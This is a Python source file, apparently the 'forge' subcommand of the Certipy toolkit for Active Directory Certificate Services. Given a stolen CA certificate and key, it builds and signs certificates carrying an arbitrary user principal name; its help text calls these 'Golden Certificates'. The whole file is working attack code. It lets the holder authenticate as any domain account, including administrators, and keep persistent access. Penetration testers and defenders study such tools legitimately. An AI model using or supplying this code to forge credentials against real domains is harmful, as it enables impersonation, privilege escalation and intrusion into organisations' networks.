import argparse
import datetime
import logging
from typing import Callable, Tuple

from certipy.auth import cert_id_to_parts
from certipy.certificate import (
    PRINCIPAL_NAME,
    NameOID,
    UTF8String,
    create_pfx,
    encoder,
    generate_rsa_key,
    hashes,
    load_pfx,
    x509,
)
from certipy.target import Target

NAME = "forge"

DN_MAP = {
    "CN": NameOID.COMMON_NAME,
    "DC": NameOID.DOMAIN_COMPONENT,
    "OU": NameOID.ORGANIZATIONAL_UNIT_NAME,
}


def dn_to_components(dn):
    components = []
    component = ""
    escape_sequence = False
    for c in dn:
        if c == "\\":
            escape_sequence = True
        elif escape_sequence and c != " ":
            escape_sequence = False
        elif c == ",":
            if "=" in component:
                attr_name, _, value = component.partition("=")
                component = (attr_name.strip().upper(), value.strip())
                components.append(component)
                component = ""
                continue

        component += c

    attr_name, _, value = component.partition("=")
    component = (attr_name.strip(), value.strip())
    components.append(component)
    return components


class Forge:
    def __init__(
        self,
        ca_pfx: str = None,
        subject: str = None,
        alt: str = None,
        serial: str = None,
        out: str = None,
        **kwargs
    ):
        self.ca_pfx = ca_pfx
        self.subject = subject
        self.alt_name = alt
        self.serial = serial
        self.out = out
        self.kwargs = kwargs

    def forge(self):
        with open(self.ca_pfx, "rb") as f:
            ca_pfx = f.read()
        ca_key, ca_cert = load_pfx(ca_pfx)

        key = generate_rsa_key()

        components = []
        for component in dn_to_components(self.subject):
            if component[0] not in DN_MAP:
                logging.warning("%s component is not implemented" % repr(component[0]))
                continue

            components.append(x509.NameAttribute(DN_MAP[component[0]], component[1]))

        serial = self.serial
        if serial is None:
            serial = x509.random_serial_number()
        else:
            serial = int(serial.replace(":", ""), 16)

        subject = x509.Name(components)
        cert = (
            x509.CertificateBuilder()
            .subject_name(subject)
            .issuer_name(ca_cert.subject)
            .public_key(key.public_key())
            .serial_number(serial)
            .not_valid_before(datetime.datetime.utcnow() - datetime.timedelta(days=1))
            .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365))
            .add_extension(
                x509.AuthorityKeyIdentifier.from_issuer_public_key(ca_key.public_key()),
                False,
            )
        )

        alt_name = self.alt_name
        if type(alt_name) == str:
            alt_name = alt_name.encode()

        alt_name = encoder.encode(UTF8String(alt_name))
        cert = cert.add_extension(
            x509.SubjectAlternativeName(
                [
                    x509.OtherName(PRINCIPAL_NAME, alt_name),
                ]
            ),
            False,
        )

        signature_hash_algorithm = ca_cert.signature_hash_algorithm.__class__
        cert = cert.sign(ca_key, signature_hash_algorithm())

        pfx = create_pfx(key, cert)

        out = self.out
        if not out:
            out, _ = cert_id_to_parts("UPN", self.alt_name)

            out = "%s.pfx" % out.rstrip("$").lower()

        with open(out, "wb") as f:
            f.write(pfx)

        logging.info("Saved forged certificate and private key to %s" % repr(out))


def entry(options: argparse.Namespace) -> None:
    forge = Forge(
        **vars(options),
    )

    forge.forge()


def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable]:
    subparser = subparsers.add_parser(NAME, help="Create Golden Certificates")

    subparser.add_argument(
        "-ca-pfx",
        action="store",
        metavar="pfx/p12 file name",
        help="Path to CA certificate",
        required=True,
    )
    subparser.add_argument(
        "-subject",
        action="store",
        metavar="subject",
        help="Subject to include certificate",
        required=True,
    )
    subparser.add_argument(
        "-alt", action="store", metavar="alternative UPN", required=True
    )
    subparser.add_argument("-serial", action="store", metavar="serial number")
    subparser.add_argument("-debug", action="store_true", help="Turn debug output on")

    group = subparser.add_argument_group("output options")
    group.add_argument("-out", action="store", metavar="output file name")

    return NAME, entry
